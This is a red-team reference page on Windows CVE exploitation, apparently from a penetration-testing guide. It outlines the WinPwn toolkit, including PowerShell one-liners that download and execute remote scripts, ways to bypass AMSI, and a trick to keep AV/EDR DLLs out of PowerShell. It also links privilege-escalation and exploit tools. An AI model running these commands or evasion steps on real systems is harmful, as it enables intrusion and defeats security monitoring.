<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Windows CVE Exploitation
### References

### Enumeration

### Broad Exploit Tools/Suites
* See Redvelatiions Guide on Apps/Services Exploitation
* <details><summary>WinPwn (S3cur3Th1sSh1t) (Click to expand)</summary><p>
	* <details><summary>References (Click to expand)</summary><p>
		* [https://github.com/S3cur3Th1sSh1t/WinPwn](https://github.com/S3cur3Th1sSh1t/WinPwn)
	* <details><summary>Notes (Click to expand)</summary><p>
		* For full offline option, use `Offline_Winpwn.ps1`
			* Core set of scripts/executables included
	* <details><summary>Process (Click to expand)</summary><p>
		1. Import the module
			* Import the Modules (one of the following ways):

					Import-Module .\WinPwn.ps1
					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')
		1. Bypass AMSI in one of the below ways
			* Obfuscate the whole script
				* Suggested: `ISESteroids` and or `Invoke-Obfuscation`
			* Use by taking an existing bypass technique
				1. Select from list
					* [https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
				1. Find the AMSI trigger and change the signature at the part via variable/function renaming, string replacement or encoding and decoding at runtime.
					* [https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)
				1. Manually change "it" in the bypass function or encode the trigger string.
		1. To spawn a new protected PowerShell Process that is set to run with `BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON` process mitigation:

				iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Obfus_SecurePS_WinPwn.ps1')
			* Prevents non-microsoft DLLs (e.g. AV/EDR products) to load into PowerShell - unless they have a Cross-Signed Microsoft certificate.
	* <details><summary>Windows Version Exploits (Click to expand)</summary><p>
		* On the system
			* metasploit

				post/windows/gather/enum_patches
				post/multi/recon/local_exploit_suggester
		* watson -<br />[https://github.com/rasta-mouse/Watson](https://github.com/rasta-mouse/Watson)
		* winpeas -<br />[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
	* <details><summary>Locally with system information (Click to expand)</summary><p>
		* Windows Exploit Suggester -<br />[https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
		* wesng -<br />[https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)
	* <details><summary>Github repos of exploits: (Click to expand)</summary><p>
		* "PoC in GitHub" -<br />[https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
		* .
	* <details><summary>Elevate from LOCAL SERVICE or NETWORK SERVICE to full privs (Click to expand)</summary><p>
		* Tools
			* "FullPowers" -<br />[https://github.com/itm4n/FullPowers](https://github.com/itm4n/FullPowers)

### Exploits
* [Eternal Blue](Testaments_and_Books/Redvelations/Windows/Exploits/Eternal_Blue.md)
* [BlueKeep](Testaments_and_Books/Redvelations/Windows/Exploits/BlueKeep.md)
* [Potatoes](Testaments_and_Books/Redvelations/Windows/Exploits/Print_Nightmare.md)
* [Print Nightmare Exploit Guide](Testaments_and_Books/Redvelations/Windows/Exploits/Print_Nightmare.md)